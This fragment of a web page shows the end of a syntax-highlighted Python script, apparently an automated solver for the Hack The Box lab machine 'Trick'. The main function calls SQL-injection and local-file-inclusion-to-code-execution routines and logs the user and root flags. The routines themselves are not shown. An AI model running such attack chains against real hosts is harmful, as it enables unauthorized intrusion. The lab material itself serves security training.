+    <span class="n">sql_injection_str2file</span><span class="p">(</span><span class="n">test</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">sql_injection_str2file</span><span class="p">()</span>
+    <span class="n">lfi_rce_marketing</span><span class="p">(</span><span class="n">test</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">lip</span> <span class="o">=</span> <span class="n">get_ip_address</span><span class="p">(</span><span class="s2">&quot;tun0&quot;</span><span class="p">)</span>
+    <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;user flag: </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">user_flag</span><span class="p">()))</span>
+    <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;root flag: </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">root_flag</span><span class="p">(</span><span class="n">lip</span><span class="p">,</span> <span class="s2">&quot;preprod-payroll.trick.htb&quot;</span><span class="p">)))</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div>
   </div>
   <div class="tag-cloud">
     <p>
